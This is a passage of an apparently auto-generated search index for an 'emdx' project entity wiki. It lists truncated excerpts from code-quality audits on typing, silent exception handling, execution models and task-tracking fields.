Estimated Effort\n[Time estimate or complexity rating]\n</code></pre> <ul> <li>#6435 Any/None typing audit [3/5] <p>briefing.py: Create TypedDicts for briefing items</p> </li> <li>analyze.py: Create TypedDicts for analysis results</li> </ul>"},{"location":"entities/estimated-effort/#low-priority-skip","title":"Low Priority / Skip","text":"<ul> <li>delegate.py: <code>**kwargs: Any</code> is appropriate for forwarding</li> <li> <p>review.py: <code>Any</code> for JSON output is approp...</p> </li> <li> <p>#6434 Any/None typing audit [4/5]   Section: Priority Recommendations</p> </li> <li>12-15 new TypedDicts needed</li> <li>~20 function signatures to update</li> <li> <p>Low risk - mostly return type narrowing</p> </li> <li> <p>#6419 Type System Audit: Replace Any/None with Concrete Types [synthesis]</p> <p>Update <code>__init__.py</code> delegating methods after underlying functions are typed</p> </li> <li>Consider runtime validation via dataclass conversion for strict mode (optional)</li> </ul>"},{"location":"entities/estimated-effort/#estimated-effort_4","title":"Estimated Effort","text":""},{"location":"entities/estimated-effort/#benefits","title":"Benefits","text":"<ul> <li>Type safety: Catch key access errors at lint time</li> <li> <p>**IDE supp...</p> </li> <li> <p>#6367 Gameplan: emdx compact \u2014 AI-Powered KB Synthesis</p> <p><code>--review</code> shows preview before committing</p> </li> <li>All tests pass</li> </ul>"},{"location":"entities/estimated-effort/#future-extensions","title":"Future Extensions","text":"<ul> <li><code>emdx distill &lt;id&gt;</code> \u2014 Single-doc summarization</li> <li><code>emdx compact --schedule weekly</code> \u2014 Cron-like auto-compaction</li> <li> <p>Integration with <code>maintain</code> command (suggest co...</p> </li> <li> <p>#6366 Gameplan: emdx distill \u2014 Synthesize KB Content for Sharing</p> <p>SynthesisService shared \u2014 Enables future <code>compact</code> command reuse</p> </li> <li>Optional deps guard \u2014 Core emdx stays lightweight, AI features require <code>[ai]</code> extra</li> </ul>"},{"location":"entities/estimated-effort/#task-checklist","title":"Task Checklist","text":"<ul> <li> <p>[ ] Create <code>emdx/services/synthesis_service.py</code> with <code>distill()</code> met...</p> </li> <li> <p>#6365 Gameplan: emdx delegate --draft-pr mode</p> <p>Low priority enhancement. ## Testing Checklist</p> </li> <li> <p>[ ] <code>emdx delegate --draft \"task\"</code> \u2192 Error: --draft requires --pr</p> </li> <li>[ ] <code>emdx delegate --pr --draft \"task\"</code> \u2192 Creates draft PR</li> <li> <p>[ ] <code>emdx delegate --pr \"task\"</code> \u2192 Creates regular PR (unchanged behavio...</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: Conclusion</p> <p>Typing Quality: Excellent Action Required: Fix 6 type mismatches Estimated Effort: 15 minutes</p> </li> <li> <p>#6368 Gameplans: compact, distill, and draft-pr [synthesis]   Section: 1. <code>emdx compact</code> Command</p> <p>Estimated Effort: 9-13 hours across 4 phases</p> </li> </ul>"},{"location":"entities/estimated-effort/#related-entities","title":"Related Entities","text":"<ul> <li><code>register command</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>integration test</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>implementation tasks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>future enhancements (out of scope)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>supporting details</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>implementation gameplan</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.3)</li> <li><code>test cases</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.1)</li> <li><code>review.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.1)</li> <li><code>task_view.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.0)</li> <li><code>synthesis layer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.0)</li> </ul>"},{"location":"entities/except-exception-pass/","title":"except exception: pass","text":"<p>Type: tech_term | Mentioned in: 11 documents | First seen: 2026-01-10</p>"},{"location":"entities/except-exception-pass/#documents-11","title":"Documents (11)","text":"<ul> <li>#6642 Delegate: Research the current state of the ActivityTable implementati   Section: 2. <code>refresh_items(items)</code> \u2014 Diff-Based Update (line 120) <p>...added/removed).</p> </li> <li> <p>Error swallowed \u2014 the per-row update is wrapped in a bare <code>except Exception: pass</code> (line 170\u2013172), so if a row key doesn't exist, it silently skips. This is a potential silent-failure point.</p> </li> <li> <p>#6382 Codebase Bug Audit 2026-02-15 [synthesis]   Section: 3. Silent Exception Swallowing</p> <p>Several locations catch exceptions and pass silently:</p> </li> <li><code>activity_items.py:489</code> \u2014 <code>except Exception: pass</code></li> <li><code>ui_config.py:60-62</code> \u2014 Silent OSError handling</li> <li> <p><code>cascade_service.py:137-138</code> \u2014 Exception only logged at debug level</p> </li> <li> <p>#6286 Delegate: DEBT-12: Fix overly broad exception catches   Section: DEBT-12: Fix overly broad exception catches</p> </li> <li> <p>#6280 Delegate: DEBT-5: Fix silent exception handlers   Section: DEBT-5: Fix Silent Exception Handlers</p> </li> <li> <p>#6261 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [15/37]   Section: 3. Fixed Silent Failures (25+ instances)</p> <p>Added debug logging to all <code>except Exception: pass</code> patterns:</p> </li> <li> <p>#6237 Delegate synthesis [synthesis]   Section: High Priority Findings</p> <p>...differs (<code>comma-separated</code> vs <code>List[str]</code>) | 3 commands | | Silent failures with <code>except Exception: pass</code> | 3 critical paths |</p> </li> <li> <p>#6227 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]</p> </li> </ul>"},{"location":"entities/except-exception-pass/#summary","title":"Summary","text":"<p>Replaced overly broad <code>except Exception:</code> blocks with specific exception types where the exception is caught but handled too broadly. This task specifically targets blocks that are NOT <code>except Exception: pass</code> (which is DEBT-5).</p>"},{"location":"entities/except-exception-pass/#summary_1","title":"Summary","text":"<p>Fixed all instances of silent exception handlers (<code>except Exception: pass</code> patterns) across the emdx/ directory by adding proper logging with context about what failed.</p>"},{"location":"entities/except-exception-pass/#critical-severity-silent-failures-hiding-bugs","title":"CRITICAL SEVERITY (Silent Failures Hiding Bugs)","text":""},{"location":"entities/except-exception-pass/#1-except-exception-pass-complete-silent-failures-31-instances","title":"1. <code>except Exception: pass</code> - Complete Silent Failures (31 instances)","text":"<p>These hide bugs and make debugging extremely difficult:</p> File Line Context `emdx/c... <ul> <li>#6220 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: Executive Summary <p>...g patterns** across the codebase. The primary issues are:</p> </li> <li>Silent failures with <code>except Exception: pass</code></li> <li>Overly broad <code>except Exception:</code> catches without proper logging</li> <li>Missing retry logic for subprocess and I/O operations</li> <li> <p>Inconsistent error logging patterns</p> </li> <li> <p>#4894 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: Theme 1: Exception Handling is a Systemic Problem</p> <p>...atic:</p> </li> <li>379 bare <code>except Exception</code> blocks (Code Smells)</li> <li>12+ instances of <code>except Exception: pass</code> (Testing/Reliability)</li> <li> <p>Silent failures masking bugs in critical paths (Performance)</p> </li> <li> <p>#4547 Tech Debt Parallel Fix - Tech_Debt_Parallel_Fix Synthesis   Section: Synthesis Log</p> <p>...e)<code>\\n\\n3. **</code>emdx/commands/maintain.py<code>** - FIXED (Commit 62dc971)\\n   - Changed</code>except Exception: pass<code>to</code>except Exception as e: logger.debug(\"Could not get process runtime: %s\", e)<code>\\n   - Changed</code>except Exception:<code>to</code>except Exception as e: logger.warning(\"Failed...</p> </li> <li> <p>#4422 Tech Debt Discovery - Discovery Synthesis   Section: Summary of Tech Debt Findings</p> </li> <li>60+ bare <code>except Exception: pass</code> blocks - Silently swallowing errors throughout the UI code, especially in <code>document_browser.py</code>, <code>pulse_browser.py</code>, and <code>smart_list.py</code></li> <li>**Exception swallowing...</li> </ul>"},{"location":"entities/except-exception-pass/#criticalhigh-severity","title":"Critical/High Severity","text":""},{"location":"entities/except-exception-pass/#related-entities","title":"Related Entities","text":"<ul> <li><code>key metrics</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>fix this sprint</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>error handling debt audit - emdx project</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>missing retry logic</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>logger.error()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>except exception as e:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>except exception</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>emdx/ui/log_browser_display.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> <li><code>emdx/commands/status.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> <li><code>emdx/__init__.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> </ul>"},{"location":"entities/except-exception/","title":"except exception:","text":"<p>Type: tech_term | Mentioned in: 12 documents | First seen: 2026-01-10</p>"},{"location":"entities/except-exception/#documents-12","title":"Documents (12)","text":"<ul> <li> <p>#6475 Dead Code and Error Handling Audit: emdx Project   Section: Overly Broad Catches (143 instances)</p> <p>Using <code>except Exception:</code> where specific exceptions should be caught:</p> </li> <li> <p>#6381 Codebase Bug Audit 2026-02-15 [8/10]   Section: 7. Silent Exception Handling</p> <p>emdx/ui/activity/activity_items.py:489</p> </li> </ul> <pre><code>except Exception:\n    pass\n</code></pre> <ul> <li>Issue: Completely silent exception swallowing</li> <li>Fix: At minimum log at DEBUG level</li> <li> <p>Severity: LOW - Preview generation, failing gracefull...</p> </li> <li> <p>#6316 Delegate: Comprehensive Codebase Quality Analysis [15/15]   Section: \u26a0\ufe0f Areas for Improvement</p> <p>...d-def]` in database layer</p> </li> <li> <p>Bare Exception Handling</p> </li> <li>31 instances of <code>except Exception:</code> without specific handling</li> <li> <p>Concentrated in UI and command modules</p> </li> <li> <p>#6286 Delegate: DEBT-12: Fix overly broad exception catches   Section: DEBT-12: Fix overly broad exception catches</p> </li> <li> <p>#6237 Delegate synthesis [synthesis]   Section: High Priority Findings</p> <p>...differs (<code>comma-separated</code> vs <code>List[str]</code>) | 3 commands | | Silent failures with <code>except Exception: pass</code> | 3 critical paths |</p> </li> <li> <p>#6235 Delegate: tech-debt,audit,comprehensive [12/14]   Section: \ud83d\udfe0 High Priority Issues</p> <p>Many bare <code>except:</code> or overly broad <code>except Exception:</code> clauses hide bugs. Ruff reports 22 violations of B904 (proper exception chaining).</p> </li> <li> <p>#6234 Delegate: Tech Debt Category Audit 2026-02-14 [14/14]   Section: CATEGORY 1: Exception Handling &amp; Error Management</p> </li> <li>31 bare <code>except Exception:</code> blocks across 18 files</li> <li>Highest concentration: <code>ui/search/search_screen.py</code> (5), <code>ui/document_browser.py</code> (3), <code>ui/cascade/cascade_view.py</code> (3)</li> <li> <p>These silen...</p> </li> <li> <p>#6227 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]</p> </li> </ul>"},{"location":"entities/except-exception/#summary","title":"Summary","text":"<p>Replaced overly broad <code>except Exception:</code> blocks with specific exception types where the exception is caught but handled too broadly. This task specifically targets blocks that are NOT <code>except Exception: pass</code> (which is DEBT-5).</p>"},{"location":"entities/except-exception/#critical-issues","title":"Critical Issues","text":""},{"location":"entities/except-exception/#critical-severity-silent-failures-hiding-bugs","title":"CRITICAL SEVERITY (Silent Failures Hiding Bugs)","text":""},{"location":"entities/except-exception/#1-except-exception-pass-complete-silent-failures-31-instances","title":"1. <code>except Exception: pass</code> - Complete Silent Failures (31 instances)","text":"<p>These hide bugs and make debugging extremely difficult:</p> File Line Context `emdx/c... <ul> <li>#6220 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: Executive Summary <p>...g patterns** across the codebase. The primary issues are:</p> </li> <li>Silent failures with <code>except Exception: pass</code></li> <li>Overly broad <code>except Exception:</code> catches without proper logging</li> <li>Missing retry logic for subprocess and I/O operations</li> <li> <p>Inconsistent error logging patte...</p> </li> <li> <p>#6071 Delegate: Python Error Handling Best Practices   Section: Top 3 Python Best Practices for Error Handling</p> <ol> <li>Be specific with exceptions - Catch specific exception types (e.g., <code>ValueError</code>, <code>FileNotFoundError</code>) rather than bare <code>except:</code> or <code>except Exception:</code>. This prevents masking unexpected errors.</li> </ol> </li> <li> <p>#4547 Tech Debt Parallel Fix - Tech_Debt_Parallel_Fix Synthesis   Section: Synthesis Log</p> <p>...<code>** - FIXED\\n   - Moved</code>import re<code>out of function to module level\\n   - Changed</code>except Exception:<code>to</code>except (OSError, UnicodeDecodeError) as e:<code>(line 51)\\n   - Added:</code>logger.debug(\"Failed to read file %s: %s\", filename, e)<code>\\n\\n2. **</code>emdx/services/document_exe...</p> </li> <li> <p>#4422 Tech Debt Discovery - Discovery Synthesis   Section: Synthesis of 5 outputs (error: FOREIGN KEY constraint failed)</p> <p>...: Read [23:47:14] \ud83d\udcc4 Tool result:      1\u2192emdx/services/document_executor.py:160:    except Exception:      2\u2192/Users/alexrockwell/dev/w... [23:47:15] \ud83d\udcc4 Tool result:      1\u2192emdx/services/document_executor.py:18:from typing import Any, List, Optional      2\u2192emdx/serv......</p> </li> </ul>"},{"location":"entities/except-exception/#related-entities","title":"Related Entities","text":"<ul> <li><code>missing retry logic</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>tenacity</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>subprocess.subprocesserror</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>sqlite3.error</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>silent failures hiding bugs</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>short-term (p2)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>narrow exception types</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>long-term (p3)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>logger.exception()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>immediate actions (p1)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> </ul>"},{"location":"entities/execution/","title":"execution","text":"<p>Type: heading | Mentioned in: 17 documents | First seen: 2026-01-10</p>"},{"location":"entities/execution/#documents-17","title":"Documents (17)","text":"<ul> <li> <p>#6472 EMDX Task System: Architecture, Data Model, and Integration   Section: Overview</p> <p>The EMDX task system is a sophisticated activity tracking and execution management layer that coordinates AI-powered work delegation. Originally evolved from a workflow system, it now serves as the persistent record of all AI delegations...</p> </li> <li> <p>#6182 Delegate: analysis,task-system [13/15]   Section: Overview</p> <p>The EMDX task system is a sophisticated job management and execution tracking system that integrates with the delegate command for AI-powered task execution. It provides hierarchical task management, dependency tracking, execution his...</p> </li> <li> <p>#6584 Delegate: Add missing all exports to emdx/services/cli_executor/__ [1/2]   Section: <code>emdx/services/__init__.py</code> \u2014 9 Symbols Added</p> Symbol Source Module Used By <code>Execution</code> <code>execution_service</code> <code>ui/log_browser.py</code>, <code>ui/log_browser_display.py</code>, <code>ui/log_browser_filtering.py</code> <code>get_recent_executions</code> <code>execution_service</code> `ui/log_... </li> <li> <p>#6489 None Type Analysis [4/7]   Section: None Type Annotation Analysis: Model Files</p> <p>Analysis of <code>| None</code> type annotations in <code>emdx/models/tasks.py</code>, <code>emdx/models/executions.py</code>, <code>emdx/models/tags.py</code>, and <code>emdx/models/categories.py</code>.</p> </li> <li> <p>#6436 Any/None typing audit [5/5]   Section: cascade/cascade_view.py</p> <p>...scriber | None<code>| |</code>_selected_exec<code>| L100 |</code>dict[str, Any] | None<code>| \u2705 Yes |</code>ExecutionRow | None<code>| |</code>_show_execution_preview<code>| L249 |</code>exec_data: dict[str, Any]<code>| \u2705 Yes |</code>ExecutionRow<code>| |</code>_start_log_stream.w<code>| L317 |</code>w: Any<code>| \u2705 Yes |</code>RichLo...</p> </li> <li> <p>#6372 Codebase Bug Audit 2026-02-15 [4/10]</p> </li> <li> <p>#6330 Delegate synthesis [synthesis]   Section: Code Organization Issues</p> <ol> <li>Execution support misplaced in utils/: <code>claude_wrapper.py</code>, <code>output_parser.py</code>, <code>structured_logger.py</code> belong in <code>services/</code></li> </ol> </li> <li> <p>#6325 Delegate: Analyze emdx/database/ and emdx/models/ for architecture imp [4/10]   Section: 2. Inconsistent Data Access Patterns</p> <p>Pattern B - Dataclasses:</p> </li> <li> <p><code>models/executions.py:14-60</code>: Returns <code>Execution</code> dataclass</p> </li> <li> <p>#6310 Delegate: Analyze DATA FLOW &amp; STATE MANAGEMENT across emdx/ (exclude u [7/15]   Section: Key Design Patterns</p> <p>...ervice.py<code>,</code>tag_service.py`)</p> </li> <li>DTO Pattern \u2014 Dataclasses for typed results (<code>Execution</code>, <code>SemanticMatch</code>, etc.)</li> <li> <p>Context Manager \u2014 Database connections via <code>get_connection()</code> context manager</p> </li> <li> <p>#6268 Delegate: Document #6230 (Migration/Schema Debt Implementation)   Section: 1. Fixed Execution Dataclass (MEDIUM severity)</p> <p>File: <code>emdx/models/executions.py</code></p> </li> <li> <p>#6249 Migration/Schema Debt Fix Implementation [6/14]   Section: Changes Made</p> </li> <li>Added missing columns to <code>Execution</code> dataclass:</li> <li><code>cascade_run_id</code> (migration 031)</li> <li> <p><code>task_id</code>, <code>cost_usd</code>, <code>tokens_used</code>, `in...</p> </li> <li> <p>#6237 Delegate synthesis [synthesis]   Section: Critical Findings (Immediate Action Required)</p> <p>...Issue: <code>shell=True</code> with user input in <code>--each</code> flag enables arbitrary command execution</p> </li> <li> <p>Fix: Validate/restrict commands or use <code>shlex.split()</code> with <code>shell=False</code></p> </li> <li> <p>#6233 Delegate: Dead Code Audit - emdx Project [2/14]   Section: 1. UNUSED IMPORTS (High Priority)</p> <p>..._TAGGING_CONFIDENCE<code>,</code>DEFAULT_TASK_PRIORITY<code>,</code>EMDX_CONFIG_DIR<code>,</code>EMDX_LOG_DIR<code>,</code>EXECUTION_HISTORY_DAYS<code>,</code>EXECUTION_TIMEOUT_SECONDS<code>,</code>NEAR_DUPLICATE_THRESHOLD<code>,</code>STALE_DOCUMENT_ARCHIVAL_DAYS<code>,</code>STALE_EXECUTION_TIMEOUT_SECONDS<code>,</code>TRASH_CLEANUP_DAYS`</p> </li> <li> <p>`em...</p> </li> <li> <p>#6228 Delegate: Audit MIGRATION/SCHEMA DEBT in the emdx project: Check datab [6/14]   Section: 1. MEDIUM: Execution Dataclass Out of Sync with Schema**</p> <p>File: <code>emdx/models/executions.py:14-25</code></p> </li> <li> <p>#6216 Delegate: Audit MIGRATION/SCHEMA DEBT in the emdx project: Check datab [6/14]   Section: MIGRATION/SCHEMA DEBT AUDIT - emdx project</p> </li> <li> <p>#6169 Delegate: Analyze the task runner service. Read emdx/services/task_run [3/15]   Section: Overview</p> <p>The task runner service (<code>emdx/services/task_runner.py</code>) provides a task-based execution model that wraps Claude execution with structured task management. It is primarily used by <code>emdx task run</code> command.</p> </li> <li> <p>#4422 Tech Debt Discovery - Discovery Synthesis   Section: Synthesis of 5 outputs (error: FOREIGN KEY constraint failed)</p> </li> </ul>"},{"location":"entities/execution/#emdx-models-bug-audit-report","title":"EMDX Models Bug Audit Report","text":"<p>Date: 2026-02-15 Scope: emdx/models/ directory (documents.py, tags.py, tasks.py, categories.py, executions.py)</p>"},{"location":"entities/execution/#1-execution-model-sync-finding-1-medium","title":"1. Execution Model Sync (Finding #1 - MEDIUM)","text":""},{"location":"entities/execution/#executive-summary","title":"Executive Summary","text":"<p>Found 7 findings ranging from HIGH to LOW severity. The most critical issues involve  lost columns during migration 013 and model/schema mismatches for the executions table.</p>"},{"location":"entities/execution/#output-1","title":"Output 1","text":""},{"location":"entities/execution/#agent-execution-log","title":"Agent Execution Log","text":""},{"location":"entities/execution/#related-entities","title":"Related Entities","text":"<ul> <li><code>task_execution</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>task types</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>task granularity</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>status flow</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>dict(row)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.2)</li> <li><code>unified_executor</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.1)</li> <li><code>task_executions.execution_type</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.1)</li> <li><code>task_deps table</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.1)</li> <li><code>task lifecycle</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.1)</li> <li><code>update_execution_heartbeat()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.8)</li> </ul>"},{"location":"entities/executionid/","title":"execution_id","text":"<p>Type: tech_term | Mentioned in: 25 documents | First seen: 2026-02-13</p>"},{"location":"entities/executionid/#documents-25","title":"Documents (25)","text":"<ul> <li>#6812 Delegate: Fix DOC-9: Update docs/architecture.md to reflect v0.20.0 TU [4/5]   Section: Changes to <code>docs/architecture.md</code> <p>...(recent history)</p> </li> <li>Described <code>ActivityDataLoader</code> deduplication logic (tasks with <code>execution_id</code> skip duplicates; <code>output_doc_id</code> removes duplicate documents)</li> <li>Added jump navigation keys: <code>R/T/D</code> to jump to section headers</li> <li> <p>Added <code>x</code> kill/dismiss, <code>c</code> copy mo...</p> </li> <li> <p>#6811 Delegate: Fix DOC-7: Update docs/cli-api.md to add the --json flag to  [2/5]   Section: Summary</p> <p>...g all fields from <code>SingleResult.to_dict()</code>: <code>task_id</code>, <code>doc_id</code>, <code>output_doc_id</code>, <code>execution_id</code>, <code>exit_code</code>, <code>success</code>, <code>duration_seconds</code>, <code>duration</code></p> </li> <li>Note about optional fields (<code>pr_url</code>, <code>branch_name</code>, <code>error</code>)</li> <li> <p>Parallel task JSON output structure...</p> </li> <li> <p>#6750 Delegate: Document #6709 (Design: Unified Dashboard Data Model):</p> </li> </ul>"},{"location":"entities/executionid/#un-12","title":"Un [1/2]","text":"<p>Section: What was implemented:</p> <p>...etching ready + active + recently completed tasks - Deduplication: Tasks with <code>execution_id</code> matching an existing execution are skipped; documents with IDs matching a task's <code>output_doc_id</code> are removed - Three-tier sorting: Tier 1 (running executions by...</p> <ul> <li> <p>#6678 Delegate Slimming Research [1/3]   Section: (B) MUST STAY IN LAUNCHER \u2014 Hooks can't do these</p> <p>...DX_AUTO_SAVE<code>,</code>EMDX_TITLE<code>,</code>EMDX_TAGS<code>,</code>EMDX_BATCH_FILE<code>,</code>EMDX_TASK_ID<code>,</code>EMDX_EXECUTION_ID<code>,</code>EMDX_DOC_ID`. These are the bridge to hooks \u2014 the launcher must set them before the child process starts. | | 8 | **Prompt construction (PR/branch instructions)...</p> </li> <li> <p>#6605 Delegate: Fix PR #687: Add ExecutionResultDict TypedDict for Execution   Section: Changes Made</p> <p>...the end of the file</p> </li> <li> <p>13 fields matching <code>ExecutionResult.to_dict()</code>: <code>success</code>, <code>execution_id</code>, <code>log_file</code>, <code>output_doc_id</code>, <code>output_content</code>, <code>tokens_used</code>, <code>input_tokens</code>, <code>output_tokens</code>, <code>cost_usd</code>, <code>execution_time_ms</code>, <code>error_message</code>, <code>exit_code</code>, `cli_...</p> </li> <li> <p>#6604 Delegate: Add ExecutionResultDict TypedDict for ExecutionResult.to_dic   Section: Changes</p> <p>...xecutor types\" section (before Document Merger types)</p> </li> <li> <p>Fields: <code>success</code> (bool), <code>execution_id</code> (int), <code>log_file</code> (str), <code>output_doc_id</code> (int | None), <code>output_content</code> (str | None), <code>tokens_used</code> (int), <code>input_tokens</code> (int), <code>output_tokens</code> (int), <code>cost_usd</code> (...</p> </li> <li> <p>#6577 Delegate: Audit emdx/services/ for functions that still return dict[str, Any] [1/3]   Section: 1. <code>unified_executor.py:192</code> \u2014 <code>ExecutionResult.to_dict()</code></p> <p>...ape is fully known** \u2014 it serializes a dataclass with 12 fixed fields (<code>success</code>, <code>execution_id</code>, <code>log_file</code>, <code>output_doc_id</code>, <code>output_content</code>, <code>tokens_used</code>, <code>input_tokens</code>, <code>output_tokens</code>, <code>cost_usd</code>, <code>execution_time_ms</code>, <code>error_message</code>, <code>exit_code</code>, `cli_...</p> </li> <li> <p>#6564 Delegate: Analyze the emdx delegate command implementation in emdx/com [1/3]   Section: Task Tracking</p> <ul> <li>Tasks created via <code>_safe_create_task()</code> (never fails delegate)</li> </ul> </li> <li>Tasks linked to executions via <code>execution_id</code></li> <li>Status transitions: <code>active</code> \u2192 <code>done</code> / <code>failed</code> / <code>partial</code></li> <li> <p>Parent task created for parallel batches</p> </li> <li> <p>#6504 Any Type Removal Analysis [5/5]   Section: emdx/commands/delegate.py</p> <p>Recommended Type:</p> </li> </ul> <pre><code>def _safe_update_task(\n    task_id: int | None,\n    *,\n    status: str | None = None,\n    error: str | None = None,\n    execution_id: int | None = None,\n    output_doc_id: int | None = None,\n) -&gt; None:\n</code></pre> <ul> <li> <p>#6472 EMDX Task System: Architecture, Data Model, and Integration   Section: Tasks Table (Core Entity)</p> <p>...for execution | | <code>type</code> | TEXT | \"single\" | Task type: single, group, chain | | <code>execution_id</code> | INTEGER | NULL | FK to executions table | | <code>output_doc_id</code> | INTEGER | NULL | FK to documents (output) | | <code>source_doc_id</code> | INTEGER | NULL | FK to documents (in...</p> 